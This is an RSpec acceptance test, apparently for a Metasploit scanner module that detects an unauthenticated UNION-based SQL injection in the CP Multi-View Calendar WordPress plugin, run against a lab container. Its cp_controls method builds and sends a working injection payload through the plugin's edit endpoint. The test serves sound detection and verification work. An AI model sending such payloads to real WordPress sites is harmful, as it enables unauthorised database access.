require 'acceptance_spec_helper'
require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'socket'
require 'uri'

RSpec.describe 'CP Multi-View Calendar genuine targets', acceptance: true, order: :defined do
  include_context 'module target'

  before(:all) do
    @cp = { commands: [], requests: [], calls: [], reports: [], controls: [] }
    @release = ENV.fetch('CP_CALENDAR_RELEASE', '1.1.4')
    @mode = ENV.fetch('CP_CALENDAR_MODE', 'enabled')
    @prefix = ENV.fetch('CP_CALENDAR_PREFIX', '')
    @event = ENV['CP_CALENDAR_NATIVE_EVENT'] == '1'
    @vulnerable = @mode == 'enabled' && %w[1.1.4 1.1.5].include?(@release)
    begin
      catalog = JSON.parse(File.read('test/module_targets/cp_calendar/releases.json')).fetch(@release)
      @columns = catalog.fetch('event_columns')
      @baseline = cp_identity('installed')
      expect(@baseline.values_at('core', 'php', 'uid', 'database', 'database_role')).to eq(['6.8.3', '8.3.28', 33, 'wp_root', 'module_target@%'])
      expect(@baseline.fetch('server')).to start_with('11.2.2-MariaDB')
      expect(@baseline.fetch('database_grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
      installed = @mode != 'absent'
      active = @mode == 'enabled'
      expect(@baseline.values_at('installed', 'active', 'plugin_version')).to eq([installed, active, installed ? @release : nil])
      expect(@baseline.fetch('installed_sha256')).to eq(installed ? catalog.fetch('installed_sha256') : {})
      expect(@baseline.fetch('archive_sha256')).to eq(catalog.fetch('sha256'))
      expect(@baseline.fetch('active_plugins')).to eq(active ? ['cp-multi-view-calendar/cp-multi-view-calendar.php'] : [])
      expect(@baseline.values_at('prefix', 'table_prefix')).to eq([@prefix, ENV.fetch('CP_CALENDAR_TABLE_PREFIX', 'wp_')])
      expect(@baseline.fetch('users').map { |row| row.fetch('user_login') }).to eq(%w[module_admin module_author module_subscriber module_editor])
      expect(@baseline.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
      if active
        expect(@baseline.fetch('native_tables').keys.sort).to eq(%w[dc_mv_calendars dc_mv_configuration dc_mv_events dc_mv_views])
        expect(@baseline.dig('native_tables', 'dc_mv_events', 'rows')).to eq([])
        expect(@baseline.dig('native_tables', 'dc_mv_calendars', 'rows').first.fetch('id')).to eq('1')
        expect(@baseline.dig('native_tables', 'dc_mv_events', 'columns').map { |row| row.fetch('Field') }).to eq(@columns)
        expect(@columns.length).to eq(14)
        expect(@columns).to include('starttime', 'endtime', 'location')
      else
        expect(@baseline.fetch('native_tables')).to eq({})
      end
      cp_create_event if @event
      @baseline = cp_identity('before')
      cp_controls('before')
      expect(cp_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      expect(cp_sql('SELECT usesuper FROM pg_user WHERE usename=current_user').strip).to eq('f')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets')
      cp_workspace("cp_calendar_target_#{Process.pid}")
      output = console_command("irb -e 'puts \"CALENDAR_PROVENANCE=\" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file(\"modules/#{cp_fullname}.rb\").hexdigest}.to_json'")
      @cp[:provenance] = JSON.parse(output.match(/^CALENDAR_PROVENANCE=(.+)$/)[1])
      expect(@cp.fetch(:provenance).fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@cp.fetch(:provenance).fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{cp_fullname}.rb").hexdigest)
      @cp[:preflight] = 'passed'
    ensure
      cp_save
    end
  end

  after(:all) do
    if @cp&.key?(:preflight)
      cp_controls('after')
      cp_reports
      expect(cp_identity('after')).to eq(@baseline)
      expect(console_command('irb -e \'puts "CALENDAR_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('CALENDAR_STATE={"sessions":[],"jobs":[]}')
      expect(Dir.glob(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*'))).to eq([])
    end
  ensure
    cp_save
  end

  2.times do |iteration|
    it "verifies genuine detection or refusal on run #{iteration + 1}" do
      cp_run("normal-#{iteration + 1}", expected: @vulnerable)
    end
  end

  if ENV['CP_CALENDAR_CLOSED_PORT'] == '1'
    it 'does not report a finding on a reserved closed loopback port' do
      socket = Socket.new(:INET, :STREAM, 0)
      socket.bind(Socket.sockaddr_in(0, '127.0.0.1'))
      port = socket.local_address.ip_port
      cp_workspace("cp_calendar_target_#{Process.pid}_closed")
      cp_run('closed-port', { 'RPORT' => port, 'HttpClientTimeout' => 3 }, expected: false)
    ensure
      socket&.close
    end
  end

  def cp_fullname
    'auxiliary/scanner/http/wordpress_cp_calendar_sqli'
  end

  def cp_run(label, overrides = {}, expected:)
    options = { 'TARGETURI' => @prefix + '/', 'VHOST' => 'module-target.test', 'VERBOSE' => true }.merge(overrides)
    @cp.fetch(:calls) << { label: label, workspace: @workspace, options: options, expected_finding: expected, state: 'started' }
    cp_save
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    output = run_target_module(cp_fullname, 'app', options, allow_errors: true, command_timeout: 45)
    @cp.fetch(:calls).last.merge!(state: 'returned', seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started, output_base64: Base64.strict_encode64(output.b))
    cp_save
    rows = cp_reports
    expect(output).not_to match(/Unknown datastore option|Auxiliary (?:failed|aborted)|Exception|NoMethodError/)
    expect(output).to include('Checking host')
    expect(output).not_to include('Server did not respond in an expected way') unless label == 'closed-port'
    if expected
      expect(output).to include('Vulnerable to unauthenticated SQL injection within CP Multi-View Calendar')
      expect(rows.length).to eq(1)
      row = rows.first
      endpoint = target_endpoint('app')
      expect(row.values_at('address', 'port', 'proto')).to eq([endpoint.fetch('host'), endpoint.fetch('port'), 'tcp'])
      expect(row.fetch('name')).to eq('Unauthenticated UNION-based SQL injection in CP Multi-View Calendar 1.1.4 for Wordpress')
      expect(row.fetch('refs')).to eq(['EDB-36243'])
      expect(row.fetch('modules')).to eq([cp_fullname])
      expect(row.fetch('attempts')).to be >= 1
    else
      expect(output).not_to include('Vulnerable to unauthenticated SQL injection')
      expect(rows).to eq([])
    end
    expect(cp_sql("SELECT count(*) FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id WHERE w.name='#{@workspace}'").strip).to eq('0')
    cp_save
  ensure
    @cp.fetch(:calls).last[:console_base64] = Base64.strict_encode64(console.all_data.b) unless @cp.fetch(:calls).empty?
    cp_save
  end

  def cp_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-cp-calendar.json'), JSON.pretty_generate(@cp)) if @cp
  end

  def cp_command(label, role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @cp.fetch(:commands) << { label: label, argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exit: status.exitstatus }
    cp_save
    raise "Native Calendar command failed: #{label}: #{error}" unless status.success?

    output
  end

  def cp_identity(label)
    JSON.parse(cp_command(label, 'app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def cp_http(label, parameters = nil, path: nil)
    request = Net::HTTP::Get.new(path || @prefix + '/?' + URI.encode_www_form(parameters))
    request['Host'] = 'module-target.test'
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    http.max_retries = 0
    response = http.request(request)
    @cp.fetch(:requests) << { label: label, path: request.path, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    cp_save
    response
  end

  def cp_create_event
    expect(@mode).to eq('enabled')
    response = cp_http('native-event-api-create', {
      'action' => 'data_management', 'cpmvc_do_action' => 'mvparse', 'f' => 'datafeed', 'method' => 'add', 'calid' => '1',
      'CalendarStartTime' => '01/01/2026 10:00', 'CalendarEndTime' => '01/01/2026 11:00',
      'CalendarTitle' => 'Module target native event', 'IsAllDayEvent' => '0', 'location' => 'Native Calendar Room'
    })
    expect(response.code).to eq('200')
    created = JSON.parse(response.body)
    expect(created.values_at('IsSuccess', 'Data')).to eq([true, 1])
    @cp[:event_api_create] = created
    events = cp_identity('after-event-api').dig('native_tables', 'dc_mv_events', 'rows')
    expect(events.length).to eq(1)
    expect(events.first.values_at('id', 'title', 'location')).to eq(['1', 'Module target native event', 'Native Calendar Room'])
  end

  def cp_controls(phase)
    response = cp_http(phase + '-login', path: @prefix + '/wp-login.php')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="log"', 'name="pwd"', 'wp-submit')
    response = cp_http(phase + '-ordinary', { 'cpmvc_do_action' => 'mvparse', 'f' => 'edit', 'id' => @event ? '1' : '0' })
    expect(response.code).to eq('200')
    if @mode == 'enabled'
      expect(response.body).to include('Calendar Details', 'id="fmEdit"', 'id="Location"')
      expect(response.body).to include('Native Calendar Room') if @event
    else
      expect(response.body).not_to include('Calendar Details')
    end
    observed = {}
    %w[false true].each do |truth|
      marker = "Native#{phase}#{truth}CalendarMarker"
      columns = @columns
      fields = Array.new(columns.length, 'NULL')
      fields[columns.index('location')] = 'CONCAT(0x' + marker[0, 6].unpack1('H*') + ',0x' + marker[6..].unpack1('H*') + ')'
      [['starttime', '2026-01-01 10:00:00'], ['endtime', '2026-01-01 11:00:00']].each do |column, stamp|
        fields[columns.index(column)] = 'CAST(0x' + stamp.unpack1('H*') + ' AS DATETIME)'
      end
      payload = '-1 UNION ALL SELECT ' + fields.join(',') + ' WHERE 812=' + (truth == 'true' ? '812' : '813') + '-- '
      response = cp_http(phase + truth, { 'cpmvc_do_action' => 'mvparse', 'f' => 'edit', 'id' => payload })
      expect(response.code).to eq('200')
      observed[truth] = response.body.include?(marker)
      expect(observed[truth]).to be(@vulnerable && truth == 'true')
    end
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |key|
        text = cp_command(phase + role + key, role, 'cat', '/sys/fs/cgroup/' + key)
        values = text.lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if key == 'memory.events'
        expect(values.fetch('max')).to eq(0) if key == 'pids.events'
      end
    end
    @cp.fetch(:controls) << { phase: phase, observed_markers: observed, status: 'passed' }
    cp_save
  end

  def cp_workspace(name)
    @workspace = name
    expect(@workspace).to match(/\Acp_calendar_target_[0-9]+(?:_closed)?\z/)
    expect(console_command("workspace -a #{@workspace}")).to include(@workspace)
    expect(cp_reports).to eq([])
  end

  def cp_sql(query)
    cp_command('sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def cp_reports
    raise 'Invalid diagnostic workspace' unless @workspace.match?(/\Acp_calendar_target_[0-9]+(?:_closed)?\z/)

    rows = JSON.parse(cp_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT vuln.id,vuln.name,host(h.address::inet) AS address,service.port,service.proto,
          ARRAY(SELECT ref.name FROM refs ref JOIN vulns_refs vr ON vr.ref_id=ref.id WHERE vr.vuln_id=vuln.id ORDER BY ref.name) refs,
          ARRAY(SELECT DISTINCT attempt.module FROM vuln_attempts attempt WHERE attempt.vuln_id=vuln.id ORDER BY attempt.module) modules,
          (SELECT count(*) FROM vuln_attempts attempt WHERE attempt.vuln_id=vuln.id) attempts
        FROM vulns vuln JOIN hosts h ON h.id=vuln.host_id JOIN workspaces w ON w.id=h.workspace_id
        LEFT JOIN services service ON service.id=vuln.service_id WHERE w.name='#{@workspace}'
      ) row
    SQL
    @cp.fetch(:reports) << { workspace: @workspace, rows: rows }
    cp_save
    rows
  end
end
